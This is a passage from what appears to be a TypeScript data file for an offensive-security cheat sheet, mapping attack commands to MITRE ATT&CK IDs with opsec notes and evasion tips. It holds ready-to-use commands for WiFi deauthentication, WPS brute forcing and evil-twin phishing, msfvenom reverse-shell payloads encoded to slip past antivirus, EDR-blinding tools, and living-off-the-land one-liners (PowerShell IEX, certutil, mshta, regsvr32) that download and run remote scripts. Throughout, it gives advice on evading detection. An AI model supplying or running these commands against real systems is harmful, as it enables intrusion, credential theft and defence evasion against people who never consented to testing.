        description: 'Comprehensive domain reconnaissance techniques',
        commands: [
          {
            command: 'subfinder -d {domain} -all -recursive -o subdomains.txt',
            description: 'Comprehensive subdomain discovery with all sources',
            example: 'subfinder -d example.com -all -recursive -o subdomains.txt',
            mitreTechnique: 'Active Scanning',
            mitreId: 'T1595.001',
            riskLevel: 'Low',
            platform: ['Linux', 'Windows', 'macOS'],
            opsecNotes: 'Uses passive sources, low detection risk',
            references: ['https://github.com/projectdiscovery/subfinder']
          },
          {
            command: 'amass enum -active -d {domain} -config config.ini -o amass_results.txt',
            description: 'Advanced subdomain enumeration with active techniques',
            example: 'amass enum -active -d example.com -config config.ini -o amass_results.txt',
            mitreTechnique: 'Active Scanning',
            mitreId: 'T1595.002',
            riskLevel: 'Medium',
            platform: ['Linux', 'Windows', 'macOS'],
            opsecNotes: 'Active scanning may trigger detection systems',
            evasionTips: 'Use rate limiting and distributed scanning',
            references: ['https://github.com/OWASP/Amass']
          },
          {
            command: 'assetfinder --subs-only {domain} | httprobe -c 50 | tee live_subdomains.txt',
            description: 'Find subdomains and probe for live hosts',
            example: 'assetfinder --subs-only example.com | httprobe -c 50 | tee live_subdomains.txt',
            mitreTechnique: 'Active Scanning',
            mitreId: 'T1595.001',
            riskLevel: 'Medium',
            platform: ['Linux', 'Windows', 'macOS'],
            opsecNotes: 'HTTP probing generates logs on target servers'
          },
          {
            command: 'dnsrecon -d {domain} -t axfr,brt,srv,std',
            description: 'Comprehensive DNS reconnaissance',
            example: 'dnsrecon -d example.com -t axfr,brt,srv,std',
            mitreTechnique: 'Active Scanning',
            mitreId: 'T1595.002',
            riskLevel: 'Medium',
            platform: ['Linux', 'Windows', 'macOS'],
            opsecNotes: 'Zone transfer attempts are logged by DNS servers'
          },
          {
            command: 'fierce --domain {domain} --subdomains accounts,admin,api,dev,mail,test,www',
            description: 'DNS reconnaissance with custom subdomain list',
            example: 'fierce --domain example.com --subdomains accounts,admin,api,dev,mail,test,www',
            mitreTechnique: 'Active Scanning',
            mitreId: 'T1595.002',
            riskLevel: 'Low',
            platform: ['Linux', 'Windows', 'macOS']
          }
        ]
      },
      {
        name: 'Advanced Social Media Intelligence',
        description: 'Advanced intelligence gathering from social media platforms',
        commands: [
          {
            command: 'sherlock {username}',
            description: 'Find usernames across social networks',
            example: 'sherlock john_doe',
            mitreTechnique: 'Gather Victim Identity Information',
            mitreId: 'T1589.003',
            riskLevel: 'Low',
            platform: ['Linux', 'Windows', 'macOS'],
            opsecNotes: 'Passive reconnaissance, very low detection risk',
            references: ['https://github.com/sherlock-project/sherlock']
          },
          {
            command: 'twint -u {username} --email --phone --hide-output -o {output_file}',
            description: 'Extract emails and phone numbers from Twitter',
            example: 'twint -u target_user --email --phone --hide-output -o twitter_intel.txt',
            mitreTechnique: 'Gather Victim Identity Information',
            mitreId: 'T1589.002',
            riskLevel: 'Low',
            platform: ['Linux', 'Windows', 'macOS'],
            opsecNotes: 'Uses Twitter API, consider rate limiting'
          },
          {
            command: 'linkedin2username -c "{company}" -n "{first_name} {last_name}"',
            description: 'Generate potential usernames from LinkedIn profiles',
            example: 'linkedin2username -c "Acme Corp" -n "John Doe"',
            mitreTechnique: 'Gather Victim Identity Information',
            mitreId: 'T1589.003',
            riskLevel: 'Low',
            platform: ['Linux', 'Windows', 'macOS']
          },
          {
            command: 'holehe {email}',
            description: 'Check if email is registered on various platforms',
            example: 'holehe john.doe@example.com',
            mitreTechnique: 'Gather Victim Identity Information',
            mitreId: 'T1589.002',
            riskLevel: 'Low',
            platform: ['Linux', 'Windows', 'macOS'],
            references: ['https://github.com/megadose/holehe']
          }
        ]
      },
      {
        name: 'Email Intelligence',
        description: 'Email reconnaissance and validation techniques',
        commands: [
          {
            command: 'theHarvester -d {domain} -l 500 -b all -f harvester_results',
            description: 'Comprehensive email harvesting from all sources',
            example: 'theHarvester -d example.com -l 500 -b all -f harvester_results',
            mitreTechnique: 'Gather Victim Identity Information',
            mitreId: 'T1589.002',
            riskLevel: 'Low',
            platform: ['Linux', 'Windows', 'macOS'],
            opsecNotes: 'Passive collection from public sources'
          },
          {
            command: 'h8mail -t {email} --chase --power-chase',
            description: 'Email OSINT and breach hunting',
            example: 'h8mail -t john.doe@example.com --chase --power-chase',
            mitreTechnique: 'Gather Victim Identity Information',
            mitreId: 'T1589.002',
            riskLevel: 'Low',
            platform: ['Linux', 'Windows', 'macOS'],
            references: ['https://github.com/khast3x/h8mail']
          },
          {
            command: 'emailfinder -d {domain}',
            description: 'Find email addresses associated with a domain',
            example: 'emailfinder -d example.com',
            mitreTechnique: 'Gather Victim Identity Information',
            mitreId: 'T1589.002',
            riskLevel: 'Low',
            platform: ['Linux', 'Windows', 'macOS']
          }
        ]
      },
      {
        name: 'Certificate Transparency',
        description: 'Certificate transparency log analysis',
        commands: [
          {
            command: 'curl -s "https://crt.sh/?q=%25.{domain}&output=json" | jq -r ".[].name_value" | sort -u',
            description: 'Extract subdomains from certificate transparency logs',
            example: 'curl -s "https://crt.sh/?q=%25.example.com&output=json" | jq -r ".[].name_value" | sort -u',
            mitreTechnique: 'Active Scanning',
            mitreId: 'T1595.001',
            riskLevel: 'Low',
            platform: ['Linux', 'macOS'],
            opsecNotes: 'Passive reconnaissance using public CT logs'
          },
          {
            command: 'certspotter -domain {domain}',
            description: 'Monitor certificate transparency logs for domain',
            example: 'certspotter -domain example.com',
            mitreTechnique: 'Active Scanning',
            mitreId: 'T1595.001',
            riskLevel: 'Low',
            platform: ['Linux', 'Windows', 'macOS']
          }
        ]
      }
    ]
  },
  {
    name: 'Wireless Attacks',
    icon: <Wifi className="w-5 h-5" />,
    description: 'Wireless network penetration testing techniques',
    subcategories: [
      {
        name: 'Advanced WiFi Reconnaissance',
        description: 'Advanced wireless network discovery and analysis',
        commands: [
          {
            command: 'airodump-ng {interface}',
            description: 'Monitor wireless networks and capture packets',
            example: 'airodump-ng wlan0mon',
            mitreTechnique: 'Network Sniffing',
            mitreId: 'T1040',
            riskLevel: 'Medium',
            platform: ['Linux'],
            prerequisites: 'Wireless interface in monitor mode',
            opsecNotes: 'Passive monitoring, low detection risk'
          },
          {
            command: 'iwlist {interface} scan | grep -E "ESSID|Address|Quality"',
            description: 'Scan for available wireless networks',
            example: 'iwlist wlan0 scan | grep -E "ESSID|Address|Quality"',
            mitreTechnique: 'Network Service Discovery',
            mitreId: 'T1046',
            riskLevel: 'Low',
            platform: ['Linux'],
            opsecNotes: 'Active scanning may be detected by wireless IDS'
          },
          {
            command: 'wash -i {interface}',
            description: 'Identify WPS-enabled access points',
            example: 'wash -i wlan0mon',
            mitreTechnique: 'Network Service Discovery',
            mitreId: 'T1046',
            riskLevel: 'Low',
            platform: ['Linux'],
            prerequisites: 'Monitor mode interface'
          },
          {
            command: 'kismet -c {interface}',
            description: 'Advanced wireless network detector and analyzer',
            example: 'kismet -c wlan0',
            mitreTechnique: 'Network Sniffing',
            mitreId: 'T1040',
            riskLevel: 'Low',
            platform: ['Linux'],
            references: ['https://www.kismetwireless.net/']
          }
        ]
      },
      {
        name: 'WPA/WPA2 Attacks',
        description: 'Attacks against WPA/WPA2 encrypted networks',
        commands: [
          {
            command: 'airodump-ng -c {channel} --bssid {bssid} -w {output} {interface}',
            description: 'Capture handshake from specific access point',
            example: 'airodump-ng -c 6 --bssid 00:11:22:33:44:55 -w handshake wlan0mon',
            mitreTechnique: 'Network Sniffing',
            mitreId: 'T1040',
            riskLevel: 'Medium',
            platform: ['Linux'],
            opsecNotes: 'Passive capture, requires client connection'
          },
          {
            command: 'aireplay-ng -0 {count} -a {bssid} -c {client} {interface}',
            description: 'Deauthentication attack to force handshake capture',
            example: 'aireplay-ng -0 10 -a 00:11:22:33:44:55 -c 66:77:88:99:AA:BB wlan0mon',
            mitreTechnique: 'Network Denial of Service',
            mitreId: 'T1498.001',
            riskLevel: 'High',
            platform: ['Linux'],
            opsecNotes: 'Active attack, easily detected and may be illegal',
            evasionTips: 'Use targeted deauth against specific clients'
          },
          {
            command: 'aircrack-ng -w {wordlist} -b {bssid} {capture_file}',
            description: 'Crack WPA/WPA2 handshake using wordlist',
            example: 'aircrack-ng -w /usr/share/wordlists/rockyou.txt -b 00:11:22:33:44:55 handshake-01.cap',
            mitreTechnique: 'Brute Force',
            mitreId: 'T1110.002',
            riskLevel: 'Low',
            platform: ['Linux'],
            opsecNotes: 'Offline attack, no network interaction'
          },
          {
            command: 'hashcat -m 22000 {hash_file} {wordlist}',
            description: 'GPU-accelerated WPA/WPA2 cracking',
            example: 'hashcat -m 22000 handshake.hc22000 /usr/share/wordlists/rockyou.txt',
            mitreTechnique: 'Brute Force',
            mitreId: 'T1110.002',
            riskLevel: 'Low',
            platform: ['Linux', 'Windows'],
            prerequisites: 'GPU with OpenCL/CUDA support'
          }
        ]
      },
      {
        name: 'WPS Attacks',
        description: 'WiFi Protected Setup vulnerability exploitation',
        commands: [
          {
            command: 'reaver -i {interface} -b {bssid} -vv',
            description: 'WPS PIN brute force attack',
            example: 'reaver -i wlan0mon -b 00:11:22:33:44:55 -vv',
            mitreTechnique: 'Brute Force',
            mitreId: 'T1110.001',
            riskLevel: 'High',
            platform: ['Linux'],
            opsecNotes: 'Active attack, generates significant traffic',
            evasionTips: 'Use delay options to avoid rate limiting'
          },
          {
            command: 'bully -b {bssid} -c {channel} {interface}',
            description: 'Alternative WPS PIN attack tool',
            example: 'bully -b 00:11:22:33:44:55 -c 6 wlan0mon',
            mitreTechnique: 'Brute Force',
            mitreId: 'T1110.001',
            riskLevel: 'High',
            platform: ['Linux']
          },
          {
            command: 'wifite --wps-only --target {bssid}',
            description: 'Automated WPS attack with Wifite',
            example: 'wifite --wps-only --target 00:11:22:33:44:55',
            mitreTechnique: 'Brute Force',
            mitreId: 'T1110.001',
            riskLevel: 'High',
            platform: ['Linux'],
            references: ['https://github.com/derv82/wifite2']
          }
        ]
      },
      {
        name: 'Evil Twin Attacks',
        description: 'Rogue access point attacks',
        commands: [
          {
            command: 'hostapd {config_file}',
            description: 'Create rogue access point with hostapd',
            example: 'hostapd /etc/hostapd/hostapd.conf',
            mitreTechnique: 'Rogue Wi-Fi Access Points',
            mitreId: 'T1465',
            riskLevel: 'Critical',
            platform: ['Linux'],
            opsecNotes: 'Highly detectable, may violate regulations',
            prerequisites: 'Wireless interface capable of AP mode'
          },
          {
            command: 'fluxion',
            description: 'Automated evil twin attack framework',
            example: 'fluxion',
            mitreTechnique: 'Rogue Wi-Fi Access Points',
            mitreId: 'T1465',
            riskLevel: 'Critical',
            platform: ['Linux'],
            opsecNotes: 'Creates fake captive portal for credential harvesting',
            references: ['https://github.com/FluxionNetwork/fluxion']
          },
          {
            command: 'wifiphisher -aI {interface} -jI {interface2} -e {essid}',
            description: 'Automated phishing attack against WiFi users',
            example: 'wifiphisher -aI wlan0 -jI wlan1 -e "Free WiFi"',
            mitreTechnique: 'Rogue Wi-Fi Access Points',
            mitreId: 'T1465',
            riskLevel: 'Critical',
            platform: ['Linux'],
            references: ['https://github.com/wifiphisher/wifiphisher']
          }
        ]
      }
    ]
  },
  {
    name: 'Mobile Security',
    icon: <Smartphone className="w-5 h-5" />,
    description: 'Mobile application and device security testing',
    subcategories: [
      {
        name: 'Android Testing',
        description: 'Android application security testing techniques',
        commands: [
          {
            command: 'adb devices',
            description: 'List connected Android devices',
            mitreTechnique: 'System Information Discovery',
            mitreId: 'T1082',
            riskLevel: 'Low',
            platform: ['Linux', 'Windows', 'macOS'],
            prerequisites: 'Android Debug Bridge (ADB) installed'
          },
          {
            command: 'adb shell pm list packages',
            description: 'List all installed packages on Android device',
            mitreTechnique: 'Software Discovery',
            mitreId: 'T1518',
            riskLevel: 'Low',
            platform: ['Linux', 'Windows', 'macOS']
          },
          {
            command: 'adb pull /data/data/{package_name}/ ./app_data/',
            description: 'Extract application data from Android device',
            example: 'adb pull /data/data/com.example.app/ ./app_data/',
            mitreTechnique: 'Data from Local System',
            mitreId: 'T1005',
            riskLevel: 'Medium',
            platform: ['Linux', 'Windows', 'macOS'],
            prerequisites: 'Root access or debuggable app'
          },
          {
            command: 'apktool d {apk_file}',
            description: 'Decompile Android APK file',
            example: 'apktool d app.apk',
            mitreTechnique: 'Software Discovery',
            mitreId: 'T1518.001',
            riskLevel: 'Low',
            platform: ['Linux', 'Windows', 'macOS'],
            references: ['https://ibotpeaches.github.io/Apktool/']
          },
          {
            command: 'jadx -d {output_dir} {apk_file}',
            description: 'Decompile APK to Java source code',
            example: 'jadx -d ./decompiled app.apk',
            mitreTechnique: 'Software Discovery',
            mitreId: 'T1518.001',
            riskLevel: 'Low',
            platform: ['Linux', 'Windows', 'macOS']
          },
          {
            command: 'frida -U -f {package_name} -l {script.js}',
            description: 'Dynamic analysis with Frida on Android',
            example: 'frida -U -f com.example.app -l hook_script.js',
            mitreTechnique: 'Process Injection',
            mitreId: 'T1055',
            riskLevel: 'Medium',
            platform: ['Linux', 'Windows', 'macOS'],
            prerequisites: 'Frida server running on device'
          }
        ]
      },
      {
        name: 'iOS Testing',
        description: 'iOS application security testing techniques',
        commands: [
          {
            command: 'ideviceinfo',
            description: 'Get iOS device information',
            mitreTechnique: 'System Information Discovery',
            mitreId: 'T1082',
            riskLevel: 'Low',
            platform: ['Linux', 'macOS'],
            prerequisites: 'libimobiledevice installed'
          },
          {
            command: 'ideviceinstaller -l',
            description: 'List installed applications on iOS device',
            mitreTechnique: 'Software Discovery',
            mitreId: 'T1518',
            riskLevel: 'Low',
            platform: ['Linux', 'macOS']
          },
          {
            command: 'class-dump -H {binary} -o {output_dir}',
            description: 'Extract Objective-C class information',
            example: 'class-dump -H ./App -o ./headers/',
            mitreTechnique: 'Software Discovery',
            mitreId: 'T1518.001',
            riskLevel: 'Low',
            platform: ['macOS']
          },
          {
            command: 'otool -L {binary}',
            description: 'List shared libraries used by iOS binary',
            example: 'otool -L ./App',
            mitreTechnique: 'Software Discovery',
            mitreId: 'T1518.001',
            riskLevel: 'Low',
            platform: ['macOS']
          },
          {
            command: 'frida -U -f {bundle_id} -l {script.js}',
            description: 'Dynamic analysis with Frida on iOS',
            example: 'frida -U -f com.example.app -l hook_script.js',
            mitreTechnique: 'Process Injection',
            mitreId: 'T1055',
            riskLevel: 'Medium',
            platform: ['Linux', 'Windows', 'macOS'],
            prerequisites: 'Jailbroken device with Frida installed'
          }
        ]
      },
      {
        name: 'Mobile Network Testing',
        description: 'Mobile network security testing',
        commands: [
          {
            command: 'tcpdump -i any -w mobile_traffic.pcap',
            description: 'Capture mobile network traffic',
            mitreTechnique: 'Network Sniffing',
            mitreId: 'T1040',
            riskLevel: 'Medium',
            platform: ['Linux'],
            prerequisites: 'Root access on device'
          },
          {
            command: 'mitmproxy --mode transparent --showhost',
            description: 'Intercept mobile HTTPS traffic',
            mitreTechnique: 'Adversary-in-the-Middle',
            mitreId: 'T1557',
            riskLevel: 'High',
            platform: ['Linux', 'Windows', 'macOS'],
            prerequisites: 'Certificate installed on mobile device'
          },
          {
            command: 'objection -g {package_name} explore',
            description: 'Runtime mobile application security testing',
            example: 'objection -g com.example.app explore',
            mitreTechnique: 'Process Injection',
            mitreId: 'T1055',
            riskLevel: 'Medium',
            platform: ['Linux', 'Windows', 'macOS'],
            references: ['https://github.com/sensepost/objection']
          }
        ]
      }
    ]
  },
  {
    name: 'Evasion Techniques',
    icon: <Skull className="w-5 h-5" />,
    description: 'Anti-detection and evasion techniques',
    subcategories: [
      {
        name: 'AV Evasion',
        description: 'Antivirus and EDR evasion techniques',
        commands: [
          {
            command: 'msfvenom -p windows/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -e x86/shikata_ga_nai -i 10 -f exe > payload.exe',
            description: 'Generate encoded payload to evade AV',
            example: 'msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -e x86/shikata_ga_nai -i 10 -f exe > payload.exe',
            mitreTechnique: 'Obfuscated Files or Information',
            mitreId: 'T1027',
            riskLevel: 'High',
            platform: ['Linux', 'Windows', 'macOS'],
            opsecNotes: 'Multiple encoding iterations may still be detected',
            evasionTips: 'Use custom encoders, combine with packers, avoid common payloads'
          },
          {
            command: 'veil -t Evasion -p go/meterpreter/rev_tcp.py',
            description: 'Generate AV-evasive payload with Veil',
            mitreTechnique: 'Obfuscated Files or Information',
            mitreId: 'T1027',
            riskLevel: 'High',
            platform: ['Linux'],
            references: ['https://github.com/Veil-Framework/Veil'],
            evasionTips: 'Use Go/Rust payloads, less signatured than C/C++'
          },
          {
            command: 'python3 Invoke-Obfuscation.py -f {powershell_script}',
            description: 'Obfuscate PowerShell scripts',
            example: 'python3 Invoke-Obfuscation.py -f payload.ps1',
            mitreTechnique: 'Obfuscated Files or Information',
            mitreId: 'T1027.006',
            riskLevel: 'Medium',
            platform: ['Linux', 'Windows', 'macOS'],
            evasionTips: 'Use multiple obfuscation layers, avoid common patterns'
          },
          {
            command: 'upx --best {executable}',
            description: 'Pack executable to evade signature detection',
            example: 'upx --best payload.exe',
            mitreTechnique: 'Software Packing',
            mitreId: 'T1027.002',
            riskLevel: 'Medium',
            platform: ['Linux', 'Windows', 'macOS'],
            opsecNotes: 'UPX packing is commonly detected by modern AV',
            evasionTips: 'Use custom packers like Themida, VMProtect, or write your own'
          },
          {
            command: 'donut -f {format} -a {arch} {payload}',
            description: 'Generate position-independent shellcode with Donut',
            example: 'donut -f 1 -a 2 payload.exe',
            mitreTechnique: 'Reflective Code Loading',
            mitreId: 'T1620',
            riskLevel: 'High',
            platform: ['Linux', 'Windows'],
            opsecNotes: 'In-memory execution, harder to detect on disk',
            evasionTips: 'Combine with process hollowing or DLL injection',
            references: ['https://github.com/TheWover/donut']
          },
          {
            command: 'ScareCrow -I {payload.bin} -Loader dll -domain {domain}',
            description: 'Generate EDR-evasive payloads with ScareCrow',
            example: 'ScareCrow -I payload.bin -Loader dll -domain microsoft.com',
            mitreTechnique: 'Masquerading',
            mitreId: 'T1036.005',
            riskLevel: 'High',
            platform: ['Linux', 'Windows'],
            opsecNotes: 'Uses legitimate certificates and domains for evasion',
            evasionTips: 'Use real company domains, vary loader types',
            references: ['https://github.com/optiv/ScareCrow']
          },
          {
            command: 'python3 avet.py -f {payload} --encode_to_exe --avoid_av',
            description: 'AntiVirus Evasion Tool (AVET) for payload generation',
            example: 'python3 avet.py -f payload.exe --encode_to_exe --avoid_av',
            mitreTechnique: 'Obfuscated Files or Information',
            mitreId: 'T1027',
            riskLevel: 'High',
            platform: ['Linux'],
            evasionTips: 'Use multiple evasion techniques, test against target AV',
            references: ['https://github.com/govolution/avet']
          },
          {
            command: 'python3 phantom-evasion.py --setup',
            description: 'Phantom-Evasion framework for AV bypass',
            mitreTechnique: 'Obfuscated Files or Information',
            mitreId: 'T1027',
            riskLevel: 'High',
            platform: ['Linux'],
            evasionTips: 'Use crypters and multiple encoding layers',
            references: ['https://github.com/oddcod3/Phantom-Evasion']
          }
        ]
      },
      {
        name: 'Network Evasion',
        description: 'Network-level evasion and steganography',
        commands: [
          {
            command: 'nmap -sS -T1 -f --data-length 200 {target}',
            description: 'Stealth SYN scan with fragmentation and timing evasion',
            example: 'nmap -sS -T1 -f --data-length 200 192.168.1.1',
            mitreTechnique: 'Network Service Discovery',
            mitreId: 'T1046',
            riskLevel: 'Low',
            platform: ['Linux', 'Windows', 'macOS'],
            opsecNotes: 'Slow scan to avoid detection, may take hours',
            evasionTips: 'Use decoy IPs (-D), source port spoofing (--source-port)'
          },
          {
            command: 'hping3 -S -p {port} -c 1 --tcp-timestamp --id +1 {target}',
            description: 'Custom TCP packet crafting for evasion',
            example: 'hping3 -S -p 80 -c 1 --tcp-timestamp --id +1 192.168.1.1',
            mitreTechnique: 'Network Service Discovery',
            mitreId: 'T1046',
            riskLevel: 'Low',
            platform: ['Linux'],
            evasionTips: 'Randomize packet timing, use legitimate source ports'
          },
          {
            command: 'nmap -sI {zombie_host} {target}',
            description: 'Idle scan using zombie host for IP spoofing',
            example: 'nmap -sI 192.168.1.50 192.168.1.1',
            mitreTechnique: 'Network Service Discovery',
            mitreId: 'T1046',
            riskLevel: 'Medium',
            platform: ['Linux', 'Windows', 'macOS'],
            opsecNotes: 'Requires finding suitable zombie host with predictable IP ID',
            evasionTips: 'Use multiple zombie hosts, verify zombie suitability first'
          },
          {
            command: 'proxychains4 -f /etc/proxychains4.conf {command}',
            description: 'Route traffic through proxy chains for anonymity',
            example: 'proxychains4 -f /etc/proxychains4.conf nmap -sT 192.168.1.1',
            mitreTechnique: 'Proxy',
            mitreId: 'T1090',
            riskLevel: 'Medium',
            platform: ['Linux'],
            evasionTips: 'Use SOCKS5 proxies, rotate proxy chains regularly',
            prerequisites: 'Configured proxy chain in proxychains4.conf'
          },
          {
            command: 'tor --SocksPort 9050 --ControlPort 9051',
            description: 'Route traffic through Tor network',
            mitreTechnique: 'Proxy',
            mitreId: 'T1090.003',
            riskLevel: 'Medium',
            platform: ['Linux', 'Windows', 'macOS'],
            opsecNotes: 'Tor exit nodes may be monitored or blocked',
            evasionTips: 'Use bridges, change circuits frequently'
          },
          {
            command: 'scapy -c "send(IP(dst=\\"{target}\\")/TCP(dport={port},flags=\\"S\\"))"',
            description: 'Custom packet crafting with Scapy',
            example: 'scapy -c "send(IP(dst=\\"192.168.1.1\\")/TCP(dport=80,flags=\\"S\\"))"',
            mitreTechnique: 'Network Service Discovery',
            mitreId: 'T1046',
            riskLevel: 'Low',
            platform: ['Linux', 'Windows', 'macOS'],
            evasionTips: 'Craft packets to mimic legitimate traffic patterns'
          },
          {
            command: 'dnscat2-client {domain}',
            description: 'DNS tunneling for covert communication',
            example: 'dnscat2-client tunnel.example.com',
            mitreTechnique: 'Protocol Tunneling',
            mitreId: 'T1572',
            riskLevel: 'High',
            platform: ['Linux', 'Windows', 'macOS'],
            opsecNotes: 'DNS queries may be logged and analyzed',
            evasionTips: 'Use legitimate-looking domain names, vary query patterns',
            references: ['https://github.com/iagox86/dnscat2']
          },
          {
            command: 'iodine -f -P {password} {subdomain}.{domain}',
            description: 'DNS tunneling with iodine',
            example: 'iodine -f -P mypassword tunnel.example.com',
            mitreTechnique: 'Protocol Tunneling',
            mitreId: 'T1572',
            riskLevel: 'High',
            platform: ['Linux', 'macOS'],
            evasionTips: 'Use subdomains of legitimate domains',
            references: ['https://github.com/yarrick/iodine']
          },
          {
            command: 'proxychains4 -f /etc/proxychains4.conf {command}',
            description: 'Route traffic through proxy chains',
            example: 'proxychains4 -f /etc/proxychains4.conf nmap -sT 192.168.1.1',
            mitreTechnique: 'Proxy',
            mitreId: 'T1090',
            riskLevel: 'Low',
            platform: ['Linux'],
            opsecNotes: 'Helps hide source IP but may introduce latency'
          },
          {
            command: 'tor --SocksPort 9050 --ControlPort 9051',
            description: 'Route traffic through Tor network',
            mitreTechnique: 'Proxy',
            mitreId: 'T1090.003',
            riskLevel: 'Low',
            platform: ['Linux', 'Windows', 'macOS'],
            opsecNotes: 'Provides anonymity but Tor traffic may be blocked'
          }
        ]
      },
      {
        name: 'Living Off The Land',
        description: 'Using legitimate system tools for malicious purposes',
        commands: [
          {
            command: 'powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "IEX (New-Object Net.WebClient).DownloadString(\"{url}\\")"',
            description: 'Download and execute PowerShell script from web',
            example: 'powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "IEX (New-Object Net.WebClient).DownloadString(\\"https://example.com/script.ps1\\")"',
            mitreTechnique: 'Command and Scripting Interpreter',
            mitreId: 'T1059.001',
            riskLevel: 'High',
            platform: ['Windows'],
            opsecNotes: 'PowerShell execution is heavily monitored',
            evasionTips: 'Use AMSI bypass, obfuscate commands, use alternative download methods'
          },
          {
            command: 'certutil.exe -urlcache -split -f {url} {output_file}',
            description: 'Download files using Windows certutil',
            example: 'certutil.exe -urlcache -split -f https://example.com/payload.exe payload.exe',
            mitreTechnique: 'Ingress Tool Transfer',
            mitreId: 'T1105',
            riskLevel: 'Medium',
            platform: ['Windows'],
            opsecNotes: 'Certutil downloads are logged in Windows Event Log',
            evasionTips: 'Use legitimate-looking URLs, delete cache after use'
          },
          {
            command: 'bitsadmin /transfer myDownloadJob /download /priority normal {url} {local_path}',
            description: 'Download files using Windows BITS service',
            example: 'bitsadmin /transfer myDownloadJob /download /priority normal https://example.com/file.exe C:\\temp\\file.exe',
            mitreTechnique: 'BITS Jobs',
            mitreId: 'T1197',
            riskLevel: 'Medium',
            platform: ['Windows'],
            opsecNotes: 'BITS transfers can be monitored and logged',
            evasionTips: 'Use legitimate job names, schedule transfers during business hours'
          },
          {
            command: 'mshta.exe javascript:a=GetObject(\\"script:{url}\\").Exec();close()',
            description: 'Execute JavaScript/VBScript using mshta',
            example: 'mshta.exe javascript:a=GetObject(\\"script:https://example.com/script.sct\\").Exec();close()',
            mitreTechnique: 'Signed Binary Proxy Execution',
            mitreId: 'T1218.005',
            riskLevel: 'High',
            platform: ['Windows'],
            opsecNotes: 'Mshta execution may trigger security alerts',
            evasionTips: 'Use legitimate-looking script content, obfuscate JavaScript'
          },
          {
            command: 'rundll32.exe javascript:\\"\\..\\mshtml,RunHTMLApplication \\";document.write();GetObject(\\"script:{url}\\").Exec()',
            description: 'Execute scripts using rundll32 and mshtml',
            example: 'rundll32.exe javascript:\\"\\..\\mshtml,RunHTMLApplication \\";document.write();GetObject(\\"script:https://example.com/script.sct\\").Exec()',
            mitreTechnique: 'Signed Binary Proxy Execution',
            mitreId: 'T1218.011',
            riskLevel: 'High',
            platform: ['Windows'],
            opsecNotes: 'Rundll32 with unusual parameters is suspicious',
            evasionTips: 'Use common rundll32 parameters as decoys'
          },
          {
            command: 'regsvr32.exe /s /n /u /i:{url} scrobj.dll',
            description: 'Execute remote scripts using regsvr32',
            example: 'regsvr32.exe /s /n /u /i:https://example.com/script.sct scrobj.dll',
            mitreTechnique: 'Signed Binary Proxy Execution',
            mitreId: 'T1218.010',
            riskLevel: 'High',
            platform: ['Windows'],
            opsecNotes: 'Regsvr32 with remote URLs is highly suspicious',
            evasionTips: 'Use local files when possible, obfuscate script content'
          },
          {
            command: 'wmic.exe process call create \\"cmd.exe /c {command}\\"',
            description: 'Execute commands using WMI',
            example: 'wmic.exe process call create \\"cmd.exe /c powershell.exe -enc {base64_command}\\"',
            mitreTechnique: 'Windows Management Instrumentation',
            mitreId: 'T1047',
            riskLevel: 'Medium',
            platform: ['Windows'],
            opsecNotes: 'WMI process creation is logged in Windows Event Log',
            evasionTips: 'Use WMI for lateral movement, encode commands'
          },
          {
            command: 'forfiles /p C:\\ /m *.exe /c \\"cmd /c echo @path\\"',
            description: 'File enumeration using forfiles',
            example: 'forfiles /p C:\\Users /m *.txt /c \\"cmd /c echo @path\\"',
            mitreTechnique: 'File and Directory Discovery',
            mitreId: 'T1083',
            riskLevel: 'Low',
            platform: ['Windows'],
            evasionTips: 'Use for legitimate-looking file searches'
          },
          {
            command: 'findstr /s /i password *.txt *.ini *.config',
            description: 'Search for passwords in files using findstr',
            example: 'findstr /s /i password C:\\Users\\*\\*.txt',
            mitreTechnique: 'Unsecured Credentials',
            mitreId: 'T1552.001',
            riskLevel: 'Medium',
            platform: ['Windows'],
            evasionTips: 'Search in user directories, look for config files'
          }
        ]
      },
      {
        name: 'EDR Evasion',
        description: 'Advanced techniques to bypass Endpoint Detection and Response',
        commands: [
          {
            command: 'python3 EDRSandblast.py --usermode --kernelmode',
            description: 'Blind EDR sensors using EDRSandblast',
            mitreTechnique: 'Disable or Modify Tools',
            mitreId: 'T1562.001',
            riskLevel: 'Critical',
            platform: ['Windows'],
            opsecNotes: 'Extremely aggressive technique, high chance of detection',
            evasionTips: 'Use only when stealth is not required',
            references: ['https://github.com/wavestone-cdt/EDRSandblast']
          },
          {
            command: 'python3 SharpEDRChecker.py',
            description: 'Enumerate EDR products on target system',
            mitreTechnique: 'Software Discovery',
            mitreId: 'T1518.001',
            riskLevel: 'Low',
            platform: ['Windows'],
            evasionTips: 'Run early in engagement to plan evasion strategy',
            references: ['https://github.com/PwnDexter/SharpEDRChecker']
          },
          {
            command: 'sRDI.exe -f {dll_file} -e {export_function}',
            description: 'Convert DLL to position-independent shellcode',
            example: 'sRDI.exe -f payload.dll -e DllMain',
            mitreTechnique: 'Reflective Code Loading',
            mitreId: 'T1620',
            riskLevel: 'High',
            platform: ['Windows'],
            opsecNotes: 'In-memory execution bypasses many file-based detections',
            evasionTips: 'Use with process injection techniques',
            references: ['https://github.com/monoxgas/sRDI']
          },
          {
            command: 'python3 ThreatCheck.py -f {payload_file}',
            description: 'Identify detection signatures in payloads',
            example: 'python3 ThreatCheck.py -f payload.exe',
            mitreTechnique: 'Software Discovery',
            mitreId: 'T1518.001',
            riskLevel: 'Low',
            platform: ['Windows'],
            evasionTips: 'Use to identify and modify detected code sections',
            references: ['https://github.com/rasta-mouse/ThreatCheck']
          },
          {
            command: 'python3 DefenderCheck.py {payload_file}',
            description: 'Check payload against Windows Defender',
            example: 'python3 DefenderCheck.py payload.exe',
            mitreTechnique: 'Software Discovery',
            mitreId: 'T1518.001',
            riskLevel: 'Low',
            platform: ['Windows'],
            evasionTips: 'Iteratively modify payload until clean',
            references: ['https://github.com/matterpreter/DefenderCheck']
          },
          {
            command: 'Invoke-ReflectivePEInjection -PEPath {exe_file} -ProcessID {pid}',
            description: 'Reflectively inject PE into process memory',
            example: 'Invoke-ReflectivePEInjection -PEPath payload.exe -ProcessID 1234',
            mitreTechnique: 'Process Injection',
            mitreId: 'T1055.001',
            riskLevel: 'High',
            platform: ['Windows'],
            opsecNotes: 'In-memory execution, no disk artifacts',
            evasionTips: 'Target legitimate processes, avoid protected processes'
          },
          {
            command: 'python3 ProcessHollowing.py -t {target_process} -p {payload}',
            description: 'Process hollowing for stealth execution',
